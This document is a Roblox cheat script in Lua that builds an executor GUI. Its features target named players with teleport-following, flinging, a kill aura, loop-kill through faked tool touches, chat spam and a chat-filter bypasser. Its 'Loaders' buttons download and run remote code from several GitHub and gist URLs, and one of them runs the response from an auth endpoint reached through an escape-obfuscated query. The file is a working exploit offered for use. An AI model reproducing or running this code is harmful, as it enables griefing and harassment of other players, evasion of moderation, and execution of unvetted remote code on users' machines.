local a=loadstring(game:HttpGet('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3'))():CreateWindow("Bot");
local b=a:CreateFolder("TP");
local d=a:CreateFolder("Body Position");
local c=a:CreateFolder("Look At");
local h=a:CreateFolder("Annoy");
local f=a:CreateFolder("Closest");
local r=a:CreateFolder("Player");
local v=a:CreateFolder("Kill");
local g=a:CreateFolder("Chat");
local s=a:CreateFolder("Loaders");
getgenv().lIlIlIIIIIIIIllIIlIIIIllIlIlIIbingchiling=false;
getgenv().IIlIIIIlIllllllIlIIIllllIIllIl="";
getgenv().InputPlrBP="";
getgenv().FollowBP=false;
getgenv().InputPlrLook="";
getgenv().LookAt=false;
getgenv().InputPlrAnnoy="";
getgenv().Annoy=false;
getgenv().FollowClosestBP=false;
getgenv().LookAtClosest=false;
getgenv().Spinbot=false;
getgenv().KillAll=false;
getgenv().KillAuraRange=15;
getgenv().KillAura=false;
getgenv().PlayerToKill="";
getgenv().KillPlayer=false;
getgenv().ChatSpamSettings={ChatSpam=false;SpamText="SPONSORED BY UR MOM";SpamTextTo="All";Timeout=2.2};

--Anti AFK
if(getgenv().kuefg834rjiy983450==nil)then game:GetService("Players").LocalPlayer.Idled:connect(function()game:service("VirtualUser"):CaptureController();game:service("VirtualUser"):ClickButton2(Vector2.new());end);getgenv().kuefg834rjiy983450="nope not cracking this bitch today";end;

-- Funcs
function getclosest()
    a=9e9;
    b=nil;
    for _,c in pairs(game:GetService("Players"):GetPlayers())do 
        pcall(function()
            d=(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position-c.Character.HumanoidRootPart.Position).Magnitude
            if(d<a)then 
                if(c.Name~=game:GetService("Players").LocalPlayer.Name)then 
                    a=d;b=c;
                end;
            end;
        end);
    end;
    return(b);
end;

-- Main Script
-- TP Tab
b:Toggle("Follow player",function(bool)
    getgenv().lIlIlIIIIIIIIllIIlIIIIllIlIlIIbingchiling=bool;
    if(getgenv().IIlIIIIlIllllllIlIIIllllIIllIl=="")then 
        print("Please input a player");
        getgenv().lIlIlIIIIIIIIllIIlIIIIllIlIlIIbingchiling=false;
    end;
    spawn(function()
        while(getgenv().lIlIlIIIIIIIIllIIlIIIIllIlIlIIbingchiling==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                for _,__ in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants())do 
                    if(__:IsA("BasePart"))then
                        __.CanCollide=false;
                    end;
                end;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Players")[getgenv().IIlIIIIlIllllllIlIIIllllIIllIl].Character.HumanoidRootPart.CFrame*CFrame.new(0,0,15);
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(0,0,0);
                if(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Sit==true)then game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Jump=true;end;
            end);
        end;
    end);
end);

b:Box("Player to Follow","string",function(str)
    if(str=="")then 
        warn("Please enter a player name");
    else 
        for _,k in pairs(game:GetService("Players"):GetPlayers())do 
            if(str:lower()==k.Name:sub(1,#str):lower())then 
                getgenv().IIlIIIIlIllllllIlIIIllllIIllIl=k.Name;
                if(game:GetService("Players"):FindFirstChild(getgenv().IIlIIIIlIllllllIlIIIllllIIllIl)~=nil)then print("Target Chosen as "..getgenv().IIlIIIIlIllllllIlIIIllllIIllIl);end;
                return;
            end;
        end;
        if(game:GetService("Players"):FindFirstChild(getgenv().IIlIIIIlIllllllIlIIIllllIIllIl)==nil)then print("Inputed player could not be found");getgenv().IIlIIIIlIllllllIlIIIllllIIllIl="";end;
    end;
end);

-- Body Position Tab
d:Toggle("Follow",function(a)
    getgenv().FollowBP=a;
    if(getgenv().InputPlrBP=="")then 
        print("Please input a player")
        getgenv().FollowBP=false;
    end;

    if(getgenv().bp~=nil)then getgenv().bp:Destroy();end;if(getgenv().bpc~=nil)then getgenv().bpc:Destroy();end;
    getgenv().bp=Instance.new("BodyPosition");
    getgenv().bp.MaxForce=Vector3.new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge);
    getgenv().bp.P=getgenv().bp.P*2;
    getgenv().bp.Position=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position;
    getgenv().bpc=getgenv().bp:Clone();

    spawn(function()
        while(getgenv().FollowBP==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                for _,__ in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants())do 
                    if(__:IsA("BasePart"))then
                        __.CanCollide=false;
                    end;
                end;
                if(getgenv().bpc==nil)then getgenv().bpc=getgenv().bp:Clone();end;
                getgenv().bpc.Parent=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                if(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==false)then 
                    game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false);
			        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll);
                elseif(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==true)then 
                    game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
			        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
                end;
                game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                for _,a in pairs(game:GetService("Players").LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do a:Stop(0);end;
                b=game:GetService("Players")[getgenv().InputPlrBP].Character.HumanoidRootPart.Position;
                c=game:GetService("Players")[getgenv().InputPlrBP].Character.HumanoidRootPart.Velocity;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,b);
                getgenv().bpc.Position=b;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(c.X,0,c.Z);
            end);
        end;
        
        wait();
        game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
        game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.Humanoid;
        getgenv().bpc:Destroy();
        getgenv().bp:Destroy();
    end);
end);

d:Box("Player to Follow","string",function(str)
    if(str=="")then 
        warn("Please enter a player name");
    else 
        for _,k in pairs(game:GetService("Players"):GetPlayers())do 
            if(str:lower()==k.Name:sub(1,#str):lower())then 
                getgenv().InputPlrBP=k.Name;
                if(game:GetService("Players"):FindFirstChild(getgenv().InputPlrBP)~=nil)then print("Target Chosen as "..getgenv().InputPlrBP);end;
                return;
            end;
        end;
        if(game:GetService("Players"):FindFirstChild(getgenv().InputPlrBP)==nil)then print("Inputed player could not be found");getgenv().InputPlrBP="";end;
    end;
end);

-- Look At Tab
c:Toggle("Look At",function(a)
    getgenv().LookAt=a;
    print(a);
    if(getgenv().InputPlrLook=="")then 
        print("Please input a player");
        getgenv().LookAt=false;
    end;

    spawn(function()
        while(getgenv().LookAt==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                a=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position;
                b=game:GetService("Players"):FindFirstChild(getgenv().InputPlrLook).Character.HumanoidRootPart.Position;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,Vector3.new(b.X,a.Y,b.Z));
            end);
        end;
    end);
end)

c:Box("Player to Look At","string",function(str)
    if(str=="")then 
        warn("Please enter a player name");
    else 
        for _,k in pairs(game:GetService("Players"):GetPlayers())do 
            if(str:lower()==k.Name:sub(1,#str):lower())then 
                getgenv().InputPlrLook=k.Name;
                if(game:GetService("Players"):FindFirstChild(getgenv().InputPlrLook)~=nil)then print("Target Chosen as "..getgenv().InputPlrLook);end;
                return;
            end;
        end;
        if(game:GetService("Players"):FindFirstChild(getgenv().InputPlrLook)==nil)then print("Inputed player could not be found");getgenv().InputPlrLook="";end;
    end;
end);

-- Annoy Tab
h:Toggle("Annoy",function(a)
    getgenv().Annoy=a;
    if(getgenv().InputPlrAnnoy=="")then 
        print("Please input a player")
        getgenv().Annoy=false
    end

    if(getgenv().bp~=nil)then getgenv().bp:Destroy();end;if(getgenv().bpc~=nil)then getgenv().bpc:Destroy();end;
    getgenv().bp=Instance.new("BodyPosition");
    getgenv().bp.MaxForce=Vector3.new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge);
    getgenv().bp.P=getgenv().bp.P*2;
    getgenv().bp.Position=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
    getgenv().bpc=getgenv().bp:Clone();

    spawn(function()
        while(getgenv().Annoy==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                for _,__ in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants())do 
                    if(__:IsA("BasePart"))then
                        __.CanCollide=false;
                    end;
                end;
                if(getgenv().bpc==nil)then getgenv().bpc=getgenv().bp:Clone();end;
                getgenv().bpc.Parent=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                if(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==false)then 
                    game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false);
			        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll);
                elseif(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==true)then 
                    game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
			        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
                end;
                game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                a=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
                b=game:GetService("Players")[getgenv().InputPlrAnnoy].Character.HumanoidRootPart.Position;
                c=game:GetService("Players")[getgenv().InputPlrAnnoy].Character.HumanoidRootPart.Velocity;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,Vector3.new(b.X,a.Y,b.Z));
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,b);
                getgenv().bpc.Position=b;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(c.X,0,c.Z);
            end);
        end;
        
        wait();
        game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
        game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.Humanoid;
        getgenv().bpc:Destroy();
        getgenv().bp:Destroy();
    end);

    spawn(function()
        while(getgenv().Annoy==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                local a=game:GetService("Players")[getgenv().InputPlrAnnoy].Character.HumanoidRootPart.Position;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,Vector3.new(a.X,game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position.Y,a.Z));
            end);
        end;
    end);
    
    spawn(function()
        while(getgenv().Annoy==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,game:GetService("Players")[getgenv().InputPlrAnnoy].Character.HumanoidRootPart.Position);
            end);
        end;
    end);
end);

h:Box("Player to Annoy","string",function(str)
    if(str=="")then 
        warn("Please enter a player name");
    else 
        for _,k in pairs(game:GetService("Players"):GetPlayers())do 
            if(str:lower()==k.Name:sub(1,#str):lower())then 
                getgenv().InputPlrAnnoy=k.Name;
                if(game:GetService("Players"):FindFirstChild(getgenv().InputPlrAnnoy)~=nil)then print("Target Chosen as "..getgenv().InputPlrAnnoy);end;
                return;
            end;
        end;
        if(game:GetService("Players"):FindFirstChild(getgenv().InputPlrAnnoy)==nil)then print("Inputed player could not be found");getgenv().InputPlrAnnoy="";end;
    end;
end);

-- Closest Tab
f:Toggle("Follow Closest",function(a)
    getgenv().FollowClosestBP=a;

    if(getgenv().bp~=nil)then getgenv().bp:Destroy();end;if(getgenv().bpc~=nil)then getgenv().bpc:Destroy();end;
    getgenv().bp=Instance.new("BodyPosition");
    getgenv().bp.MaxForce=Vector3.new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge);
    getgenv().bp.P=getgenv().bp.P*2;
    getgenv().bp.Position=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
    getgenv().bpc=getgenv().bp:Clone();

    spawn(function()
        while(getgenv().FollowClosestBP==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                if(getgenv().bpc==nil)then getgenv().bpc=getgenv().bp:Clone();end;
                getgenv().bpc.Parent=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                for _,__ in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants())do 
                    if(__:IsA("BasePart"))then
                        __.CanCollide=false;
                    end;
                end;
                if(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==false)then 
                    game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false);
			        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll);
                elseif(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==true)then 
                    game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
			        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
                end;
                game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                for _,a in pairs(game:GetService("Players").LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do a:Stop(0);end;
                a=getclosest();
                b=a.Character.HumanoidRootPart.Position;
                c=a.Character.HumanoidRootPart.Velocity;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,b);
                getgenv().bpc.Position=b;
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(c.X,0,c.Z);
            end);
        end;
        
        wait();
        game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
        game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
        game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.Humanoid;
        getgenv().bpc:Destroy();
        getgenv().bp:Destroy();
    end);
end)

f:Toggle("Look At Closest",function(a)
    getgenv().LookAtClosest=a;
    spawn(function()
        while(getgenv().LookAtClosest==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                a=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
                b=getclosest().Character.HumanoidRootPart.Position
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.lookAt(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,Vector3.new(b.X,a.Y,b.Z));
            end);
        end;
    end);
end);

-- Player Tab
r:Toggle("Spinbot",function(a)
    getgenv().Spinbot=a;
    print(a);
    spawn(function()
        while(getgenv().Spinbot==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.Angles(0,math.rad(90),0);end);
        end;
    end);
end);

v:Toggle("Kill Aura",function(a)
    getgenv().KillAura=a;
    print(a);
    spawn(function()
        while(getgenv().KillAura==true)and(game:GetService("RunService").Stepped:Wait())do 
            for _,a in pairs(game:GetService("Players"):GetPlayers())do 
                pcall(function()
                    if((a.Character.HumanoidRootPart.Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=getgenv().KillAuraRange)and(a.Name~=game:GetService("Players").LocalPlayer.Name)and(a.Character.Humanoid.Health>0)and(a.Character.Humanoid.Health~=math.huge)then 
                        local tool=game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")or(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Sword"));
                        if(tool)and(tool:FindFirstChild("Handle"))then 
                            for _,a in pairs(a.Character:GetChildren())do 
                                if(a:IsA("BasePart"))then 
                                    firetouchinterest(tool.Handle,a,0);
                                    firetouchinterest(tool.Handle,a,1);
                                end;
                            end;
                        end;
                    end;
                end);
            end;
        end;
    end);
end);

v:Slider("Kill Aura Range",{min=1;max=1000;precise=false},function(a)getgenv().KillAuraRange=a;end);

v:Box("Player to Loop Kill","string",function(str)
    if(str=="")then 
        print("Please enter a player name");
    else 
        for _,k in pairs(game:GetService("Players"):GetPlayers())do 
            if(str:lower()==k.Name:sub(1,#str):lower())then 
                getgenv().PlayerToKill=k.Name;
                if(game:GetService("Players"):FindFirstChild(getgenv().PlayerToKill)~=nil)then print("Target Chosen as "..getgenv().PlayerToKill);end;
                return;
            end;
        end;
        if(game:GetService("Players"):FindFirstChild(getgenv().PlayerToKill)==nil)then print("Inputed player could not be found");getgenv().PlayerToKill="";end;
    end;
end);

v:Toggle("Loop Kill",function(a)
    getgenv().KillPlayer=a;
    print(a);
    if(getgenv().PlayerToKill=="")then 
        print("Please input a player");
        getgenv().KillPlayer=false;
    end;
    spawn(function()
        while(getgenv().KillPlayer==true)and(game:GetService("RunService").Stepped:Wait())do 
            pcall(function()
                local tool=game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")or(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Sword"));
                for _,a in pairs(game:GetService("Players")[getgenv().PlayerToKill].Character:GetChildren())do 
                    if(a:IsA("BasePart"))then 
                        firetouchinterest(tool.Handle,a,0);firetouchinterest(tool.Handle,a,1);
                    end;
                end;
            end);
        end;
    end);
end);

-- Chat Tab
g:Box("Text to Spam","string",function(a)getgenv().ChatSpamSettings.SpamText=a;end);
g:Box("Text Spam To Who","string",function(a)getgenv().ChatSpamSettings.SpamTextTo=a;end);
g:Box("Text Timeout","number",function(a)getgenv().ChatSpamSettings.Timeout=a;end);

g:Toggle("Spam",function(a)
    getgenv().ChatSpamSettings.ChatSpam=a;
    print(a);
    spawn(function()
        while(getgenv().ChatSpamSettings.ChatSpam==true)and(wait())do 
            pcall(function()game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(getgenv().ChatSpamSettings.SpamText,getgenv().ChatSpamSettings.SpamTextTo);end);
            wait(getgenv().ChatSpamSettings.Timeout);
        end;
    end);
end);

g:Button("Bypasser",function()
    getgenv().method="fn";
    if(getgenv().BypasserLoaded==nil)or(getgenv().BypasserLoaded==false)then 
        spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/daddysyn/synergy/additional/betterbypasser",true))();getgenv().BypasserLoaded=true;end);
    end;
end);

s:Button("Infinite Yield",function()
    spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();end);
end);

s:Button("Nexus Exploits",function()
    spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GwnStefano/NexusHub/main/Main",true))();end);
end);

s:Button("FE Invis Tool",function()
    spawn(function()loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))();end);
end);

s:Button("Yeet GUI ver.Trollface",function()
    spawn(function()
        getgenv().Yeeting=false;
        local lp = game:FindService("Players").LocalPlayer
            
        local function gplr(String)
            local Found = {}
            local strl = String:lower()
            if strl == "all" then
                for i,v in pairs(game.Players:GetPlayers()) do
                    table.insert(Found,v)
                end
            elseif strl == "others" then
                for i,v in pairs(game.Players:GetPlayers()) do
                    if v.Name ~= lp.Name then
                        table.insert(Found,v)
                    end
                end 
            elseif strl == "me" then
                table.insert(Found,game:FindService("Players").LocalPlayer.Name)
            else
                for i,v in pairs(game.Players:GetPlayers()) do
                    if v.Name:lower():sub(1, #String) == String:lower() then
                        table.insert(Found,v)
                    end
                end 
            end
            return Found 
        end

        local function notif(str,dur)
            game:FindService("StarterGui"):SetCore("SendNotification", {
                Title = "YEET UI",
                Text = str,
                Icon = "rbxassetid://2005276185",
                Duration = dur or 3
            })
        end

        if(game:GetService("CoreGui"):FindFirstChild("FE Yeet Gui")~=nil)then game:GetService("CoreGui"):FindFirstChild("FE Yeet Gui"):Destroy();end;
        local FEYeetGui = Instance.new("ScreenGui")
        local Main = Instance.new("ImageLabel")
        local Top = Instance.new("Frame")
        local Title = Instance.new("TextLabel")
        local TextBox = Instance.new("TextBox")
        local TextButton1 = Instance.new("TextButton")
        local TextButton2 = Instance.new("TextButton")

        FEYeetGui.Name = "FE Yeet Gui"
        FEYeetGui.Parent = game:GetService("CoreGui")
        FEYeetGui.ResetOnSpawn = false

        Main.Name = "Main"
        Main.Parent = FEYeetGui
        Main.Active = true
        Main.Draggable = true
        Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Main.BorderSizePixel = 0
        Main.Position = UDim2.new(0.17, 0, 0.46, 0)
        Main.Size = UDim2.new(0, 454, 0, 218)
        Main.Image = "rbxassetid://2005276185"

        Top.Name = "Top"
        Top.Parent = Main
        Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
        Top.BorderSizePixel = 0
        Top.Size = UDim2.new(0, 454, 0, 44)

        Title.Name = "Title"
        Title.Parent = Top
        Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
        Title.BorderSizePixel = 0
        Title.Position = UDim2.new(0, 0, 0.295454562, 0)
        Title.Size = UDim2.new(0, 454, 0, 30)
        Title.Font = Enum.Font.SourceSans
        Title.Text = "FE Yeet Gui (trollface edition)"
        Title.TextColor3 = Color3.fromRGB(255, 255, 255)
        Title.TextScaled = true
        Title.TextSize = 14.000
        Title.TextWrapped = true

        TextBox.Parent = Main
        TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
        TextBox.BorderSizePixel = 0
        TextBox.Position = UDim2.new(0.07, 0, 0.27, 0)
        TextBox.Size = UDim2.new(0, 388, 0, 62)
        TextBox.Font = Enum.Font.SourceSans
        TextBox.PlaceholderText = "Who do i yeet(can be shortened)"
        TextBox.Text = ""
        TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextBox.TextScaled = true
        TextBox.TextSize = 14.000
        TextBox.TextWrapped = true

        TextButton1.Parent = Main
        TextButton1.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
        TextButton1.BorderSizePixel = 0
        TextButton1.Position = UDim2.new(0.1, 0, 0.6, 0)
        TextButton1.Size = UDim2.new(0, 359, 0, 25)
        TextButton1.Font = Enum.Font.SourceSans
        TextButton1.Text = "Cheese em'"
        TextButton1.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextButton1.TextScaled = true
        TextButton1.TextSize = 14.000
        TextButton1.TextWrapped = true

        TextButton1.MouseButton1Click:Connect(function()
            local Target=gplr(TextBox.Text)
            if(Target[1])then
                Target=Target[1];
                getgenv().Yeeting=false;
                wait();
                getgenv().Yeeting=true;
                local neededtime=0;
                local OldPos=game:FindService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame;
                local Thrust=Instance.new('BodyThrust',game:FindService("Players").LocalPlayer.Character.HumanoidRootPart);
                Thrust.Force=Vector3.new(9999,9999,9999);
                Thrust.Name="YeetForce";
                repeat 
                    game:GetService("RunService").Stepped:Wait();
                    pcall(function()
                        for _,__ in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants())do 
                            if(__:IsA("BasePart"))then
                                __.CanCollide=false;
                            end;
                        end;
                        if(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==false)then 
                            game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false);
                            game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll);
                        elseif(game:GetService("Players").LocalPlayer.Character.Humanoid.Sit==true)then 
                            game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
                            game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
                        end;
                        game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
                        for _,a in pairs(game:GetService("Players").LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do a:Stop(0);end;
                        game:FindService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=Target.Character.HumanoidRootPart.CFrame;
                        Thrust.Location = Target.Character.HumanoidRootPart.Position;
                        neededtime+=0.001/1;
                    end);
                until(Target.Character:FindFirstChild("Head")==nil)or(getgenv().Yeeting==false);
                while(getgenv().Yeeting==true)do wait();end;
                local stopper=game:GetService("RunService").Stepped:Connect(function()
                    game:FindService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame=OldPos;
                    game:FindService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored=true;
                    game:FindService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(0,0,0);
                    game:FindService("Players").LocalPlayer.Character.HumanoidRootPart.RotVelocity=Vector3.new(0,0,0);
                end);
                wait(0.1);
                Thrust:Destroy();
                getgenv().Yeeting=false;
                print("waiting","4")
                wait(4);
                stopper:Disconnect();
                wait();
                game:FindService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored=false;
                game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
                game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
                game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.Humanoid;
            else
                notif("Invalid player")
            end
        end)

        TextButton2.Parent = Main
        TextButton2.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
        TextButton2.BorderSizePixel = 0
        TextButton2.Position = UDim2.new(0.1, 0, 0.8, 0)
        TextButton2.Size = UDim2.new(0, 359, 0, 25)
        TextButton2.Font = Enum.Font.SourceSans
        TextButton2.Text = "Stop"
        TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextButton2.TextScaled = true
        TextButton2.TextSize = 14.000
        TextButton2.TextWrapped = true

        TextButton2.MouseButton1Click:Connect(function()
            if(getgenv().Yeeting==true)then 
                getgenv().Yeeting=false;
                game:GetService("Players").LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true);
                game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp);
                game:GetService("Workspace").CurrentCamera.CameraSubject=game:GetService("Players").LocalPlayer.Character.Humanoid;
            end
        end)

        notif("Loaded successfully! Created by scuba#0001", 5)

    end);
end);

s:Button("Bedwars",function()
    spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua",true))();end);
end);

s:Button("Eclipse Hub",function()
    spawn(function()
        getgenv().mainKey="nil"
        local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
    end);
end);
